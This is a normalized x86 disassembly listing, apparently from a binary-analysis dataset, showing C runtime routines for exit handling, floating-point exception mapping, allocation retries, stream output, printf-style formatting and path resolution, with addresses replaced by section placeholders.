call eax
add esp 0xc
pop ebp
retn
sub_445af6
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_445b4b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_445b68
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_445b8c
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_44f73d
push r--data
push r--data
call sub_445b68
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_4459e0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_44dd84
call sub_4413c3
mov eax r--data
mov [ esp ] r--data
call sub_445b4b
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_4459e0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_445c11
push 0x18
push r--data
call sub_4433dc
push 0x8
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_445d28
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_443421
retn
mov [ rw-data ] ebx
push 0x8
call sub_44880c
pop ecx
push [ ebp + 0x8 ]
call sub_445b21
push r--data
mov eax r--data
call sub_445b4b
pop ecx
push [ rw-data ]
call sub_445378
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_445b4b
pop ecx
push [ rw-data ]
call sub_445378
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_44536f
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_445378
mov edi eax
call sub_44536f
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_445378
mov edi eax
push [ rw-data ]
call sub_445378
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_445d87
mov edi edi
push esi
call sub_44536f
mov esi eax
push esi
call sub_443b80
push esi
call sub_4500fd
push esi
call sub_44065a
push esi
call sub_44b2ab
push esi
call sub_45136c
push esi
call sub_45115a
push esi
call sub_445dd5
push esi
call sub_44b162
push sub_445d53
call sub_4452fd
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_445dd6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_445588
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_445f36
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_441c3d
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_445f7b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_45137b
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_445fc8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_449480
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_446016
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4413da
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_446068
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_444560
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_443b37
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_443b37
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_443d18
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_450db5
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_451499
pop ecx
test eax eax
jne r-xdata
call sub_443d18
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_450db5
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_450f72
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_451041
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_4461cc
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_4514fd
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_4461fb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
push [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
dec [ ebp + 0xc ]
call sub_4461cc
cmp [ esi ] 0xffffffff
pop ecx
je r-xdata
pop esi
pop ebp
retn
sub_446222
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
xor edi edi
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x448 ] edi
mov [ ebp - 0x408 ] edi
mov [ ebp - 0x42c ] edi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] edi
mov [ ebp - 0x43c ] edi
mov [ ebp - 0x428 ] edi
call sub_441455
cmp [ ebp - 0x430 ] edi
jne r-xdata
cmp esi edi
je r-xdata
call sub_443b37
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
movzx edx [ esi ]
xor ecx ecx
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x414 ] edi
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x418 ] edx
cmp dx di
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop edi
add esi edi
cmp [ ebp - 0x420 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
mov eax [ ebp - 0x420 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax dx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x418 ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_446d9a ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x45c ] eax
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x45c ]
mov ebx [ ebp - 0x41c ]
mov edx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x43c ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
jmp r-xdata
movzx eax dx
sub eax 0x20
je r-xdata
cmp dx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp dx 0x2a
jne r-xdata
movzx eax dx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x430 ]
push edx
lea esi [ ebp - 0x420 ]
mov [ ebp - 0x428 ] 0x1
call sub_4461cc
jmp r-xdata
movzx eax dx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] edi
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x42c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x42c ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x42c ] ebx
test ebx ebx
jge r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x40c ] ebx
test ebx ebx
jge r-xdata
movzx eax [ esi ]
cmp ax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x42c ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp ax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax edi
je r-xdata
cmp ax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov edi [ ebp - 0x40c ]
cmp edi 0xffffffff
jne r-xdata
sub eax edi
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test [ ebp - 0x408 ] 0x1000
jne r-xdata
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
add ebx 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp ax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi edi
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x410 ] ebx
je r-xdata
mov edi 0x7fffffff
mov [ ebp - 0x418 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x418 ] 0x10
je r-xdata
cmp [ ebp - 0x43c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
je r-xdata
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x448 ] ecx
jmp r-xdata
sub eax edi
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp ax 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x448 ] 0x27
test [ ebp - 0x408 ] 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x438 ] ax
mov eax [ ebp - 0x448 ]
add eax 0x51
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x424 ] edi
jmp r-xdata
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea esi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] esi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
test [ ebp - 0x408 ] 0x40
mov eax [ ebx - 0x4 ]
je r-xdata
test [ ebp - 0x408 ] 0x40
mov [ ebp - 0x41c ] ebx
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x408 ] 0x20
add edx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x418 ] edx
sub eax edi
je r-xdata
cmp ax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test edi edi
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x444 ]
call sub_44120e
and [ ebp - 0x444 ] 0x0
mov ebx [ ebp - 0x42c ]
mov esi [ ebp - 0x414 ]
sub ebx esi
sub ebx [ ebp - 0x424 ]
test [ ebp - 0x408 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax edi
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax edi
je r-xdata
cmp ax 0x78
je r-xdata
test edi edi
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x424 ]
mov edi [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
lea ecx [ ebp - 0x438 ]
call sub_44a308
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_4461fb
add esp 0xc
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp dx 0x67
jne r-xdata
mov eax [ ebx ]
add ebx 0x8
mov [ ebp - 0x46c ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x468 ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x460 ]
movsx eax dl
push [ ebp - 0x40c ]
mov [ ebp - 0x41c ] ebx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x46c ]
push esi
push eax
push [ rw-data ]
call sub_445378
pop ecx
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
call sub_451684
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test [ ebp - 0x408 ] 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ ebx ]
add ebx 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x428 ] esi
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax edi
jne r-xdata
cmp ax 0x58
je r-xdata
dec edi
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_44d943
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x428 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x424 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x418 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_443b37
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x418 ] 0x8
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x428 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x434 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x433 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_45169a
add esp 0x10
test eax eax
jge r-xdata
and [ ebp - 0x45c ] 0x0
inc eax
inc eax
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] edi
jl r-xdata
inc esi
mov ecx [ ebp - 0x410 ]
push esi
lea eax [ ebp - 0x420 ]
call sub_44a308
pop ecx
test esi esi
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x420 ]
call sub_4461fb
add esp 0xc
push 0x20
mov edi [ ebp - 0x40c ]
add edi 0x15d
push edi
call sub_445f36
mov edx [ ebp - 0x418 ]
pop ecx
mov [ ebp - 0x444 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push esi
push [ rw-data ]
call sub_445378
pop ecx
call eax
pop ecx
pop ecx
call sub_440791
add esp 0x14
cmp [ ebp - 0x44c ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
mov [ esi ] eax
mov ax [ ebp - 0x420 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x43c ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov [ ebp - 0x418 ] esi
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] edi
mov esi eax
jmp r-xdata
push esi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc esi
mov [ ebp - 0x410 ] esi
lea eax [ ebp - 0x458 ]
push eax
push esi
push [ rw-data ]
call sub_445378
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x43c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x418 ]
cdq
push edx
push eax
push ebx
push edi
call sub_4517d0
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x470 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_4461fb
add esp 0xc
or [ ebp - 0x420 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x430 ]
lea esi [ ebp - 0x420 ]
call sub_4461cc
add edi [ ebp - 0x470 ]
cmp [ ebp - 0x418 ] 0x0
pop ecx
jg r-xdata
call sub_442e20
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x448 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
cmp [ ebp - 0x420 ] 0x0
jl r-xdata
dec [ ebp - 0x418 ]
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
call sub_45169a
add esp 0x10
mov [ ebp - 0x470 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_446dc2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_446ddc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4519b1
pop ecx
cmp [ eax ] bx
je r-xdata
mov esi [ GetFullPathNameW@IAT ]
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi ebx
ja r-xdata
push ebx
push ebx
push ebx
push eax
call esi
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
jmp r-xdata
mov edi [ ebp + 0x10 ]
cmp edi eax
ja r-xdata
call [ GetLastError@IAT ]
push eax
call sub_443b5d
xor eax eax
jmp r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x7fffffff
jbe r-xdata
mov edi eax
pop ecx
mov eax [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
call sub_443b37
mov [ eax ] 0x22
jmp r-xdata
push [ ebp - 0x4 ]
call sub_44120e
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x2
push edi
call sub_4519fa
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
call sub_443b37
mov [ eax ] 0x16
push [ ebp - 0x4 ]
call sub_44120e
pop ecx
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push edi
push [ ebp + 0xc ]
call esi
cmp eax edi
jb r-xdata
